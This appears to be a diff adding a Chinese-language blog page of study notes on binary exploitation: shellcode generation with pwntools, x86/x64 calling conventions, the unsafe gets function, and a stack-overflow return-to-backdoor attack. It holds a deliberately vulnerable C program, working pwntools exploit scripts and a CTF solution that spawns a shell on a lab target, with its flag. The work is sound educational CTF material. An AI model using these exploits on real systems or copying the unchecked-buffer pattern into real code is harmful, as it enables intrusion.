@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/black/pace-theme-flat-top.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"github-dark","dark":"github-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":true,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="shellcode 的概念 基本的函数调用栈 典型栈溢出 一些危险的函数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="11.15">
+<meta property="og:url" content="http://example.com/2025/11/15/11/15/index.html">
+<meta property="og:site_name" content="超级玉米人的博客">
+<meta property="og:description" content="shellcode 的概念 基本的函数调用栈 典型栈溢出 一些危险的函数">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-11-15T01:33:02.884Z">
+<meta property="article:modified_time" content="2025-11-16T14:31:40.656Z">
+<meta property="article:author" content="超级玉米人">
+<meta property="article:tag" content="study">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2025/11/15/11/15/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2025/11/15/11/15/","path":"2025/11/15/11/15/","title":"11.15"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>11.15 | 超级玉米人的博客</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+  <script src="/js/third-party/pace.js" defer></script>
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/katex.min.css" integrity="sha256-UF1fgpAiu3tPJN/uCqEUHNe7pnr+QR0SQDNfgglgtcM=" crossorigin="anonymous">
+
+
+<!-- GitHub 丝带 -->
+<a href="https://github.com/Yoyolp/blog_recouse" class="github-corner" aria-label="View source on GitHub" target="_blank" rel="noopener">
+  <svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true">
+    <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+    <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+    <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path>
+  </svg>
+</a>
+
+<!-- particles.js 粒子库 -->
+<script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+<!-- 引入 typed.js -->
+<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12"></script>
+
+
+<style>
+  /* 原有的封面样式保持不变 */
+  #particles-js {
+    width: 100%;
+    height: 100vh;
+    position: relative;
+    background: linear-gradient(120deg, #e0c3fc 0%, #8ec5fc 100%);
+  }
+
+  .hero-content {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    text-align: center;
+    color: #fff;
+    z-index: 1;
+    width: 100%;
+  }
+
+  .hero-title {
+    font-size: 3rem;
+    font-weight: bold;
+    margin-bottom: 1rem;
+    text-shadow: 2px 2px 8px rgba(0,0,0,0.3);
+  }
+
+  .hero-subtitle {
+    font-size: 1.5rem;
+    margin-bottom: 2rem;
+    text-shadow: 1px 1px 4px rgba(0,0,0,0.3);
+    min-height: 1.8em; /* 防止布局抖动 */
+  }
+
+  /* 打字机光标样式 */
+  .typed-cursor {
+    font-size: 1.5rem;
+    opacity: 1;
+    animation: blink 0.7s infinite;
+  }
+
+  @keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0; }
+  }
+
+  .hero-arrow {
+    font-size: 2.5rem;
+    animation: bounce 2s infinite;
+    cursor: pointer;
+  }
+
+  @keyframes bounce {
+    0%, 20%, 50%, 80%, 100% {
+      transform: translateY(0);
+    }
+    40% {
+      transform: translateY(-15px);
+    }
+    60% {
+      transform: translateY(-7px);
+    }
+  }
+</style>
+
+<div id="particles-js" style="display: none;">
+  <div class="hero-content">
+    <div class="hero-title">超级玉米人的博客</div>
+    <div class="hero-subtitle">
+      <span id="typed-text"></span>
+    </div>
+    <div class="hero-arrow">↓</div>
+  </div>
+</div>
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">超级玉米人的博客</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">时间Cia不多llo~(∠・ω< )⌒★</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#shellcode"><span class="nav-number">1.</span> <span class="nav-text"> ShellCode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-pwntool-%E7%94%9F%E6%88%90%E5%AF%B9%E5%BA%94-%E5%B9%B3%E5%8F%B0%E7%9A%84shellcode"><span class="nav-number">1.1.</span> <span class="nav-text"> 使用 pwntool 生成对应 平台的shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%9F%E6%88%90shell-code"><span class="nav-number">1.1.1.</span> <span class="nav-text"> 生成shell code</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.2.</span> <span class="nav-text"> 总结:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E7%9A%84%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88"><span class="nav-number">2.</span> <span class="nav-text"> 基本的函数调用栈,</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gets%E5%92%8Cputs-%E5%87%BD%E6%95%B0"><span class="nav-number">3.</span> <span class="nav-text"> gets和puts 函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B8%E5%9E%8B%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="nav-number">4.</span> <span class="nav-text"> 典型栈溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98-2-eztext"><span class="nav-number">4.1.</span> <span class="nav-text"> 例题: 2 EZtext</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-2"><span class="nav-number">4.2.</span> <span class="nav-text"> 总结:</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="超级玉米人"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">超级玉米人</p>
+  <div class="site-description" itemprop="description">一个基于Hexo的技术博客</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Yoyolp" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Yoyolp" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+<div id="sidebar-digital-clock" class="site-overview-item">
+    <div class="clock-container">
+        <div class="clock-time">00:00:00</div>
+        <div class="clock-date">2024-01-01</div>
+        <div class="clock-weekday">星期一</div>
+    </div>
+</div>
+
+<script>
+// 简化版电子钟，避免复杂的 JS
+function initClock() {
+    function updateClock() {
+        const now = new Date();
+        const hours = String(now.getHours()).padStart(2, '0');
+        const minutes = String(now.getMinutes()).padStart(2, '0');
+        const seconds = String(now.getSeconds()).padStart(2, '0');
+        
+        const year = now.getFullYear();
+        const month = String(now.getMonth() + 1).padStart(2, '0');
+        const day = String(now.getDate()).padStart(2, '0');
+        
+        const weekdays = ['星期日', '星期一', '星期二', '星期三', '星期四', '星期五', '星期六'];
+        const weekday = weekdays[now.getDay()];
+        
+        const clockElement = document.getElementById('sidebar-digital-clock');
+        if (clockElement) {
+            clockElement.querySelector('.clock-time').textContent = hours + ':' + minutes + ':' + seconds;
+            clockElement.querySelector('.clock-date').textContent = year + '-' + month + '-' + day;
+            clockElement.querySelector('.clock-weekday').textContent = weekday;
+        }
+    }
+    
+    updateClock();
+    setInterval(updateClock, 1000);
+}
+
+// 延迟初始化，确保 DOM 加载完成
+setTimeout(initClock, 100);
+</script>
+
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/15/11/15/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="超级玉米人">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="超级玉米人的博客">
+      <meta itemprop="description" content="一个基于Hexo的技术博客">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="11.15 | 超级玉米人的博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          11.15
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-11-15 09:33:02" itemprop="dateCreated datePublished" datetime="2025-11-15T09:33:02+08:00">2025-11-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-11-16 22:31:40" itemprop="dateModified" datetime="2025-11-16T22:31:40+08:00">2025-11-16</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>shellcode 的概念</p>
+<p>基本的函数调用栈</p>
+<p>典型栈溢出</p>
+<p>一些危险的函数</p>
+<span id="more"></span>
+<h2 id="shellcode"><a class="markdownIt-Anchor" href="#shellcode"></a> ShellCode</h2>
+<p>ShellCode 是一段机器码，主要用于启动一个命令行的shell<br />
+特征:</p>
+<ul>
+<li>纯机器代码</li>
+<li>位置无关代码</li>
+<li>紧凑小巧</li>
+<li>无空字节</li>
+</ul>
+<h3 id="使用-pwntool-生成对应-平台的shellcode"><a class="markdownIt-Anchor" href="#使用-pwntool-生成对应-平台的shellcode"></a> 使用 pwntool 生成对应 平台的shellcode</h3>
+<p>使用context 可以设置全局的配置环境，可以设置：</p>
+<ul>
+<li>目标架构和操作系统</li>
+<li>日志级别</li>
+<li>终端设置</li>
+<li>其他运行参数</li>
+</ul>
+<p>以下是基本导入和设置</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwm <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 查看当前context</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置当前 context </span></span><br><span class="line">context( arch = <span class="string">&quot;i386&quot;</span>, os = <span class="string">&quot;liunx&quot;</span> )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>常用参数(arch)</p>
+<ul>
+<li>x86_64</li>
+<li>x86</li>
+<li>ARM</li>
+</ul>
+<p>常用参数os</p>
+<ul>
+<li>liunx</li>
+<li>windows</li>
+</ul>
+<p>常用参数 log_level</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不同的日志级别</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)    <span class="comment"># 最详细，显示所有信息</span></span><br><span class="line">context(log_level=<span class="string">&#x27;info&#x27;</span>)     <span class="comment"># 一般信息（默认）</span></span><br><span class="line">context(log_level=<span class="string">&#x27;warn&#x27;</span>)     <span class="comment"># 只显示警告</span></span><br><span class="line">context(log_level=<span class="string">&#x27;error&#x27;</span>)    <span class="comment"># 只显示错误</span></span><br><span class="line">context(log_level=<span class="string">&#x27;critical&#x27;</span>) <span class="comment"># 只显示严重错误</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 完全关闭日志</span></span><br><span class="line">context(log_level=<span class="string">&#x27;silent&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>同时我们也可以通过 <code> context.bits</code> 查看系统的位宽</p>
+<h4 id="生成shell-code"><a class="markdownIt-Anchor" href="#生成shell-code"></a> 生成shell code</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
+<p>其中 <code>asm</code> 方法是将汇编代码转化成机器码的方法，返回的是bytes对象，即原始机器码对象,同时生成的机器码也可以通过 <code>disasm</code> 方法进行反汇编</p>
+<p><code>shellcraft.sh() </code> 方法,是生成获取系统shell的shellcode</p>
+<h3 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结:</h3>
+<p>Shellcode 是指一小段机器码，如果题目提供的程序没有栈执行保护，可以优先使用 shellcode 注入来直接获取shell</p>
+<h2 id="基本的函数调用栈"><a class="markdownIt-Anchor" href="#基本的函数调用栈"></a> 基本的函数调用栈,</h2>
+<p>x86和x64 程序有以下一些区别：</p>
+<ul>
+<li>对于 x86 程序：
+<ul>
+<li>绝大多数情况下，函数参数通过栈来传递</li>
+<li>标准的C/C++ 调用约定(cdecl, stdcall) 完全使用栈传递参数</li>
+<li>fastcall 会使用寄存器传递前几个参数</li>
+</ul>
+</li>
+<li>对于 x64 程序:
+<ul>
+<li>前六个 整型或者指针参数依次保存在 <strong>RDI, RSI, RDX, RCX, R8 和 R9 寄存器</strong>中多余的会被一出到栈中</li>
+<li>内存地址不能大于 0x00007FFFFFFFFFFF， <strong>6 个字节长度</strong> ，否则会抛出异常 （因为为了电路简化和提高性能和安全性）</li>
+</ul>
+</li>
+</ul>
+<h2 id="gets和puts-函数"><a class="markdownIt-Anchor" href="#gets和puts-函数"></a> gets和puts 函数</h2>
+<p>在 C 语言中，<code>gets</code> 和 <code>puts</code> 都是标准输入输出库（<code>&lt;stdio.h&gt;</code>）中用于处理字符串的函数。</p>
+<ol>
+<li>gets</li>
+</ol>
+<p>从stdin 中读取字符串，直到遇到 \n 或者  EOF 为止.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span>* <span class="title function_">gets</span><span class="params">(<span class="type">char</span>* buf)</span>;</span><br></pre></td></tr></table></figure>
+<p>但是不检测缓冲区数组的边界，如果输入的数组比目标数组长，会导致缓冲区溢出，所以可以利用这一点进行攻击，但是在现在的C11 标准中<br />
+这个函数已经被移除了</p>
+<ol start="2">
+<li>puts</li>
+</ol>
+<p>将字符串输出到 stdout ,并在末尾自动添加换行fu</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">puts</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span>;</span><br></pre></td></tr></table></figure>
+<p>可以进行简单的字符串输出，比printf 高效，因为没有format操作</p>
+<h2 id="典型栈溢出"><a class="markdownIt-Anchor" href="#典型栈溢出"></a> 典型栈溢出</h2>
+<p>这是一个简单的程序</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This back door&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -no-pie ./stackflow.c -o ./stackflow</span><br></pre></td></tr></table></figure>
+<p>将其拖入IDA 中分析 发现缓冲区s 到 ret 的偏移为20 所以我们可以构建如下脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;info&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./stackflow&quot;</span>)                    <span class="comment"># 获取 该文件的保护措施</span></span><br><span class="line"></span><br><span class="line">backdoor_addr = elf.symbols[<span class="string">&#x27;backdoor&#x27;</span>]      <span class="comment"># 获取backdoor 的地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;后门函数地址 <span class="subst">&#123;<span class="built_in">hex</span>(backdoor_addr)&#125;</span>&quot;</span>)  </span><br><span class="line"></span><br><span class="line">offset = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * offset + p64(backdoor_addr)   <span class="comment"># 构建payload</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./stackflow&#x27;</span>)                    <span class="comment"># 启动程序</span></span><br><span class="line">p.sendline(payload)                           <span class="comment"># 发送payload</span></span><br><span class="line">output = p.recvall(timeout = <span class="number">2</span>)               <span class="comment"># 接受程序输出</span></span><br><span class="line"><span class="built_in">print</span>(output)                                 </span><br></pre></td></tr></table></figure>
+<h3 id="例题-2-eztext"><a class="markdownIt-Anchor" href="#例题-2-eztext"></a> 例题: <a target="_blank" rel="noopener" href="https://ctf.xidian.edu.cn/training/22?challenge=901">2 EZtext</a></h3>
+<p>将题目中获取的pwn 文件,拖入ida 发现一个后门函数 <em><strong>treasure</strong></em>, 同时在函数overflow 中发现危险函数 read，我们可以利用这一点将 返回地址 覆盖为 treasure的地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">overflow</span><span class="params">(<span class="type">int</span> n7)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">8</span>]; <span class="comment">// [rsp+18h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( n7 &lt;= <span class="number">7</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Come on, you can&#x27;t even fill up this array?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, n7);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;OK,I receive your byte.and then?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过对于buf 的分析 发现 偏移值为16</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-0000000000000008     _BYTE buf[8];</span><br><span class="line">+0000000000000000     _QWORD __saved_registers;</span><br><span class="line">+0000000000000008     _UNKNOWN *__return_address;</span><br></pre></td></tr></table></figure>
+<p>于是可以构建出如下脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;info&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">16</span></span><br><span class="line">backdoor_addr = elf.symbols[<span class="string">&quot;treasure&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;后门函数地址 <span class="subst">&#123;<span class="built_in">hex</span>(backdoor_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x40122d</span>               <span class="comment"># 指定一个其他地址 防止产生EOF 错误</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * offset + p64(ret) + p64(backdoor_addr)    </span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">44465</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Then how many bytes do you need to overflow the stack?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;64&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()              <span class="comment"># 交互</span></span><br></pre></td></tr></table></figure>
+<p>成果过去shell 得到flag：moectf{R3T2t3Xt_is-THE-StARt_0F_ROp26069ba}</p>
+<h3 id="总结-2"><a class="markdownIt-Anchor" href="#总结-2"></a> 总结:</h3>
+<p>面对此类题目：</p>
+<ul>
+<li>尝试寻找会导致栈溢出的危险函数</li>
+<li>通过 ida 静态分析 溢出变量到 ret 的偏移量</li>
+<li>定位后门函数</li>
+<li>计算偏移量</li>
+<li>绕过保护机制 构建payload</li>
+</ul>
+<p>栈溢出的主要目的就是将缓冲区等区域写入数据时候，超出边界，覆盖相邻栈的内存来（比如保存的寄存器，返回地址），来达到修改程序的作用</p>
